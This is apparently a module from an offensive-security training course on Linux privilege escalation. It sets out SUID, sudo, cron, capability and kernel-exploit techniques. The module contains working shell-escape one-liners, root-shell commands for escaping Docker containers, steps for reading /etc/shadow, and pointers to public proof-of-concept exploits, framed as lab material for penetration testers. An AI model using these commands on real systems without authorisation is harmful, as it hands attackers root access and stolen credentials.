# Module 20 · Linux Privilege Escalation

> *"You'd be amazed how many root shells live behind a misconfigured `/etc/sudoers` line."*

You have a low-privilege Linux shell. Maybe through SSH password reuse from Part 4, maybe through web RCE, maybe through a stolen developer SSH key. Now your job is to become **root** — or to find a service account with read access to `/etc/shadow`, or a Kubernetes service token with cluster-admin, or a docker-group user (which is root by another name).

Linux privesc is fundamentally a **misconfiguration hunt**. Real CVE-driven kernel exploits are rare in 2026 (modern kernels patched, KASLR, SMAP, SMEP). **Misconfigs are everywhere.** This module is your hunting playbook.

## The Linux privesc taxonomy

Every Linux privesc fits one of these categories:

| Category | Mechanism | Example |
|---|---|---|
| **SUID/SGID misuse** | Binary runs as root, has functionality you can abuse | `find / -type f -perm -4000` |
| **Sudo misuse** | `sudo` rule lets you run a binary that escapes | `sudo -l` shows `(root) /usr/bin/vim` → `:!/bin/sh` |
| **Cron job hijack** | Root cron writes to / executes a path you can write | `/etc/cron.d/backup` calls `/usr/local/bin/backup` (you control) |
| **PATH hijack** | Root binary calls `system("foo")` without absolute path → drop fake `foo` in writeable PATH | Most common in suid binaries |
| **Kernel exploit** | `uname -r` matches CVE | DirtyCow, Dirty Pipe, OverlayFS UAF |
| **Capability abuse** | Binary has POSIX capability without setuid | `cap_dac_read_search+ep` on `tar` → read shadow |
| **Group abuse** | Membership in privileged group | `docker`, `lxd`, `disk`, `wheel`, `adm` |
| **Container escape** | Inside a container, escape to host | privileged container, mounted docker socket, etc. |
| **NFS / shared FS** | NFS exports with `no_root_squash` | Mount target as root, drop SUID binary |
| **Service / app config** | App runs as root, config writeable by you | Apache config, systemd service unit, MOTD scripts |

Modern enumeration tools (LinPEAS, linenum.sh, PrivEsc.py) walk all of these in 60 seconds. We rebuild the *important parts* of LinPEAS in `linux_enum.py` — focused, faster, signal-rich.

## The 5-minute Linux enumeration

Run on every Linux foothold immediately:

```bash
# Drop and run linux_enum (works without root, single Python file, no dependencies)
python3 -m redshift_toolkit.postex.linux_enum --output /tmp/.enum.json

# Run the SUID hunter with GTFOBins matching
python3 -m redshift_toolkit.postex.suid_finder --gtfobins-check

# Audit sudo rules
python3 -m redshift_toolkit.postex.sudo_audit

# Check kernel against CVE list
python3 -m redshift_toolkit.postex.linux_kernel_check
```

The first command produces a single JSON document with **80+ pieces of information** ready for triage:

| Field | Source | Why it matters |
|---|---|---|
| `hostname` / `os_release` | `/etc/os-release`, `uname` | Identify distro for exploit selection |
| `kernel` | `uname -r` | Match against `linux_kernel_check` CVE list |
| `users[*]` | `/etc/passwd` | Service users with login shells = juicy |
| `sudoers_readable` | `/etc/sudoers`, `/etc/sudoers.d/*` | Direct config inspection |
| `world_writable_files` | `find / -perm -o+w` | Identify hijackable paths |
| `world_writable_in_path` | Cross-ref against `$PATH` | PATH hijack candidates |
| `suid_binaries[*]` | `find / -perm -4000` | Cross-ref GTFOBins |
| `capabilities[*]` | `getcap -r /` | Cap abuse paths |
| `cron_jobs[*]` | `/etc/cron*`, `/var/spool/cron/`, systemd timers | Race / write candidates |
| `ssh_keys` | `/home/*/.ssh/*` | Stolen-key paths |
| `interesting_processes` | `ps -ef` filtered | Root processes worth deeper look |
| `listening_ports` | `ss -tlnp`, `/proc/net/tcp` | Internal services to abuse |
| `mount_points` | `/proc/mounts` | NFS / overlay / privileged mounts |
| `docker_socket` | `/var/run/docker.sock` accessible? | Instant root if writable |
| `kubernetes_token` | `/var/run/secrets/kubernetes.io/...` | Inside a pod |

## SUID/SGID and GTFOBins

**SUID** (Set User ID) makes an executable run as the file's *owner* regardless of who ran it. SUID binaries owned by root run as root. The classic privesc is: find a SUID-root binary that can do something useful (read a file, exec another binary, execute shell), abuse it.

**GTFOBins** (`gtfobins.github.io`) is a curated list of ~250 Linux binaries with documented privesc paths when SUID/sudo. Examples:

| Binary | Trick |
|---|---|
| `find` | `find . -exec /bin/sh -p \; -quit` |
| `vim` | `vim -c ':!/bin/sh -p'` |
| `tar` | `tar -cf /dev/null /etc/shadow --checkpoint=1 --checkpoint-action=exec=/bin/sh` |
| `python3` | `python3 -c 'import os; os.execl("/bin/sh","sh","-p")'` |
| `cp` | `cp /etc/passwd.new /etc/passwd` (you crafted `/etc/passwd.new` with a root user) |
| `awk` | `awk 'BEGIN {system("/bin/sh -p")}'` |
| `xxd` | Read any file: `xxd /etc/shadow | xxd -r` |

Our `suid_finder` ships with the **GTFOBins database embedded** (~250 entries), matches each SUID against it, and prints the exact exploitation command:

```bash
$ python3 -m redshift_toolkit.postex.suid_finder --gtfobins-check
[+] /usr/bin/find  (root:root, 4755)
    EXPLOIT: find . -exec /bin/sh -p \; -quit
[+] /usr/bin/vim.basic  (root:root, 4755)
    EXPLOIT: vim.basic -c ':!/bin/sh -p'
[!] /usr/bin/passwd     (no GTFOBins entry — expected setuid)
```

## Sudo abuse

`sudo -l` lists what *you* can run as root. The output is the operator's gold mine:

```
$ sudo -l
User alice may run the following commands on dev01:
    (root) NOPASSWD: /usr/bin/apt-get update
    (root) NOPASSWD: /opt/scripts/backup.sh
```

`sudo_audit.py` parses this and:

1. **Matches each binary against GTFOBins.** `apt-get` is in GTFOBins (`sudo apt-get changelog apt; !/bin/sh`).
2. **Detects wildcard rules.** `/opt/scripts/*` is dangerous: drop a `/opt/scripts/x.sh` symlinking to `/bin/sh`.
3. **Detects writeable script targets.** If you have write on `/opt/scripts/backup.sh` and sudo can run it as root → instant root.
4. **Detects `env_keep` mistakes.** `env_keep += "LD_PRELOAD"` lets you `LD_PRELOAD` a malicious .so when running any sudo command.
5. **Detects sudo CVEs.** Old sudo (< 1.9.5p2) is vulnerable to **CVE-2021-3156 (Baron Samedit)** — a heap overflow with `sudoedit -s`.

Output:

```
$ python3 -m redshift_toolkit.postex.sudo_audit
[+] sudo version: 1.9.13p3 (CVE-2021-3156: NOT vulnerable)
[+] User alice rules:
    1. (root) NOPASSWD: /usr/bin/apt-get update
       → GTFOBins: sudo apt-get changelog apt
                  !/bin/sh
    2. (root) NOPASSWD: /opt/scripts/backup.sh
       → /opt/scripts/backup.sh writeable? YES (alice owner) — REPLACE WITH SHELL
```

## Cron job hijacking

`/etc/cron.d/`, `/etc/crontab`, `/var/spool/cron/`, and systemd `*.timer` units can run scripts as root. If any of these reference a path you can write, you're root next time the job fires.

`linux_enum` walks all four sources. Common findings:

```
[CRITICAL] /etc/cron.d/backup
   * * * * * root /usr/local/bin/backup.sh
   /usr/local/bin/backup.sh writable by alice (mode 777) — INSTANT ROOT
```

```
[HIGH] /etc/cron.daily/cleanup
   #!/bin/bash
   find /tmp -mtime +7 -delete
   /tmp world-writeable; race condition with find traversal
```

The classic **race condition exploit** when root scripts iterate world-writeable paths is symbolic link substitution mid-iteration. Modern `find` has `-fxargs` and `-execdir` to mitigate; old scripts don't.

## Kernel exploits

Two CVEs every Linux operator knows by heart:

### CVE-2022-0847 — Dirty Pipe

- **Affects:** Kernel 5.8 → 5.16.10, 5.15.24, 5.10.101
- **Mechanism:** Improper init of `pipe_buffer` flags lets you write to *any* file readable by your user, even if it's owned by root and not normally writeable
- **Exploit:** [haxx.in/files/dirtypipez.c](https://haxx.in/files/dirtypipez.c) — overwrites `/etc/passwd`, becomes root

### CVE-2021-4034 — PwnKit (polkit)

- **Affects:** Polkit < 0.121 (so basically every distro 2009-2021)
- **Mechanism:** `pkexec` argv[0]=NULL leads to env-var injection
- **Status:** Ubiquitous on legacy systems

`linux_kernel_check.py` ships with a curated CVE → kernel-version table covering ~30 high-impact privesc CVEs from 2016-2026:

```bash
$ python3 -m redshift_toolkit.postex.linux_kernel_check
[+] Kernel: 5.4.0-150-generic (Ubuntu 20.04)
[+] Matched 3 CVEs:
    CVE-2022-0185  (HIGH)  fs/fs_context.c heap overflow → root
    CVE-2022-0847  (HIGH)  Dirty Pipe — write to root files
    CVE-2024-1086  (HIGH)  netfilter use-after-free (TBD exploit)
[+] PoC pointers:
    CVE-2022-0847: https://haxx.in/files/dirtypipez.c
    ...
```

⚠️ **Always test kernel exploits in a snapshot lab first.** A botched exploit panics the host. Never run unverified PoCs on a customer asset.

## POSIX capabilities

Capabilities split root's privilege into ~40 individual rights. A binary can have, e.g., `CAP_NET_RAW` to send raw packets without being SUID. Some capabilities are *equivalent to root*:

| Capability | Why it's dangerous |
|---|---|
| `cap_dac_read_search` | Read any file (including `/etc/shadow`) |
| `cap_dac_override` | Bypass file permission checks entirely |
| `cap_setuid` | Become any UID (i.e. root) — `python3 -c 'import os; os.setuid(0); os.system("sh")'` |
| `cap_chown` | Change ownership of any file |
| `cap_sys_admin` | Mount, unmount, pivot_root — effectively root |
| `cap_sys_module` | Load kernel modules |
| `cap_sys_ptrace` | Ptrace any process — read root memory |
| `cap_net_admin` | Configure networking (insert kernel iptables rules, etc.) |

Find them:

```bash
$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/python3.11 = cap_setuid+ep    ← !! instant root
/usr/bin/tar = cap_dac_read_search+ep   ← read /etc/shadow
```

Our `linux_enum` runs `getcap -r /` and flags any of the above-named capabilities.

## Container escapes

You're running inside a Docker container. Five typical escapes:

### 1. Privileged container

```bash
[ -f /proc/1/status ] && grep CapEff /proc/1/status
# CapEff: 000001ffffffffff  ← all caps; you're privileged
```

If `CapEff` is `000001ffffffffff` you can mount the host disk:

```bash
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host /bin/sh
```

### 2. Mounted docker socket

```bash
ls /var/run/docker.sock  # exists?
docker -H unix:///var/run/docker.sock run -v /:/host --rm -it alpine chroot /host /bin/sh
```

### 3. Mounted host filesystem

If `/etc/shadow` is readable from inside the container, the host filesystem is bind-mounted somewhere. Check `mount`.

### 4. Host PID namespace

```bash
cat /proc/1/cmdline  # if not "init" or "tini" → host PID namespace
nsenter -t 1 -a /bin/sh
```

### 5. Cgroup release_agent (CVE-2022-0492)

If you can write to a cgroup release_agent file, you can run arbitrary commands as root on the host. Affects unpatched kernels with user-namespace + cgroup-v1.

`linux_enum.py` runs container-detection: `[ -f /.dockerenv ]`, `cat /proc/self/cgroup | grep -E 'docker|kubepods|lxc'`, and reports which escapes are accessible.

## Kubernetes-specific

Inside a Kubernetes pod, you have a service account token at `/var/run/secrets/kubernetes.io/serviceaccount/token`. With it:

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Test what we can do
curl --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
     $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreview \
     -X POST -d '{"spec":{"namespace":"default"}}' \
     -H 'Content-Type: application/json'
```

If the pod's service account has `pods/exec` rights, you can `kubectl exec` into any pod. If it has `secrets/list` you can read every secret in the namespace. We cover Kubernetes deeply in Part 9 Module 37.

## Reading `/etc/shadow` without root

Even if you can't escalate to root *interactively*, getting `/etc/shadow` is enough — crack it offline.

Paths to `/etc/shadow`:

- `cap_dac_read_search` on tar/cat/less
- LXD/LXC group membership: create a privileged container with `/` mounted
- Docker group membership
- `pkexec` (PwnKit if vulnerable)
- A SUID `find` (lots of distros ship it SUID by mistake)
- `cron` jobs that copy `/etc/shadow` to a logfile
- Backup directories (`/var/backups/shadow.bak` is a common surprise)

Our `linux_enum` tries to read `/etc/shadow` directly and reports if it succeeds.

## Industry framings

| Vertical | Linux footprint to know |
|---|---|
| **Cloud / SaaS** | EC2, GCE, AKS — all Ubuntu/Amazon Linux/CoreOS variants. SSM/IMDS endpoints; instance metadata exfil → escalating to AWS account |
| **Defense** | RHEL/CentOS/Oracle Linux fleet. SELinux enforcing makes some escalations harder; SCAP audit baselines |
| **Healthcare** | Mix of legacy CentOS 6/7 (lots of kernel CVEs); medical image processing on Linux |
| **Telecom / Energy** | Embedded Linux (Yocto, OpenWrt) on customer-premise equipment; outdated kernels often years out of date |

## Lab exercises

1. **HTB Linux Fundamentals** track — work through each box's privesc.
2. **TryHackMe Linux PrivEsc** room (free) — covers SUID/sudo/cron/path/NFS.
3. **Container escape lab.** Spin a privileged container; escape using the cgroup release_agent technique.
4. **Kernel exploit drill.** Spin Ubuntu 16.04 in a VM; run `linux_kernel_check`, exploit the matched CVE, snapshot the box first.
5. **GTFOBins drill.** For each of `find`, `vim`, `tar`, `python3`, `awk`, `nmap`, `wget`, `cp` — verify the GTFOBins exploit on a SUID-marked copy.

## Next steps

We've gone from user to root on Linux. Now flip the OS: [Module 21 — Windows Privilege Escalation](21-windows-privesc.md), where the game shifts to services, tokens, UAC, and DPAPI.
